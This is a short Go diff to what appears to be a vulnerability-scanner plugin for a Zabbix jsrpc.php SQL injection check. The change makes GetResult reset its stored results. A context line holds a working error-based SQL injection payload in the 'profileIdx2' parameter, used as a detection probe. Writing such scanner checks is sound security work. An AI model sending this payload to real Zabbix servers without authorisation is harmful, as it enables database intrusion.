@@ -31,7 +31,9 @@ func (d *zabbixJsrpcSQL) Init() plugin.Plugin {
 	return d.info
 }
 func (d *zabbixJsrpcSQL) GetResult() []plugin.Plugin {
-	return d.result
+	var result = d.result
+	d.result = []plugin.Plugin{}
+	return result
 }
 func (d *zabbixJsrpcSQL) Check(URL string, meta plugin.TaskMeta) bool {
 	poc := "/jsrpc.php?type=9&method=screen.get&timestamp=1471403798083&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1+or+updatexml(1,md5(0x36),1)+or+1=1)%23&updateProfile=true&period=3600&stime=20160817050632&resourcetype=17"
